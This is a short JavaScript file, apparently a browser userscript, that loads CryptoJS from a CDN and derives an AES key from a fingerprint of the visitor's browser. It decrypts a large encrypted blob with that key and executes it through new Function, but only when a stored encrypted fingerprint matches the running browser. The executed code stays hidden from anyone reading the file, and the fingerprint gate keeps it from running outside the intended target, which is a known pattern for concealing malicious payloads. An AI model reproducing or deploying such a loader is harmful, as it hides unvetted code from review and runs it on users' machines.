
(function() {
    'use strict';

    function loadCryptoJS(callback) {
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js';
        script.onload = callback;
        document.head.appendChild(script);
    }

    function decrypt(text, key) {
        try {
            const bytes = CryptoJS.AES.decrypt(text, key);
            return bytes.toString(CryptoJS.enc.Utf8);
        } catch (e) {
            console.error('Error decrypting:', e);
            return '';
        }
    }

    function gerarFingerprint() {
        const navigatorData = window.navigator;
        const fingerprint = [
            navigatorData.userAgent,
            navigatorData.language,
            navigatorData.platform,
            `${window.screen.width}x${window.screen.height}`,
            window.screen.colorDepth
        ].join('|');
        return fingerprint;
    }

    const encryptedCode = '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';
    const encryptedFingerprint = 'U2FsdGVkX18t4+biX4P6/eTGr/pRZeUjIt2S8p5qyoKE4OiMvjlvU0YFJYxZxC4AU9VEmLX1ZUlRe990CGYEVqDNxps+XjQg5zL/mja149p9hrDeeZUQlnqLTvnZw+Qxq7WFJU2u9vl2AmbRQVOgg3f5PdIAY0FhRkSi5NtzxlWGVndx+7hccQUuJdPUYkHMzx3+Hz3TPBpEcOlp/f54bbKSejUKe8ryA10JaaXLN96Lsb5aAHzeQNjcNHo5miwP';
    const key = gerarFingerprint();

    loadCryptoJS(function() {
        const decryptedFingerprint = decrypt(encryptedFingerprint, key);
        if (gerarFingerprint() === decryptedFingerprint) {
            const decryptedCode = decrypt(encryptedCode, key);
            try {
                // Execute the decrypted code directly in the current context
                (new Function(decryptedCode))();
            } catch (e) {
                console.error('Error evaluating code:', e);
            }
        } else {
            console.error('Fingerprint does not match.');
        }
    });
})();
        
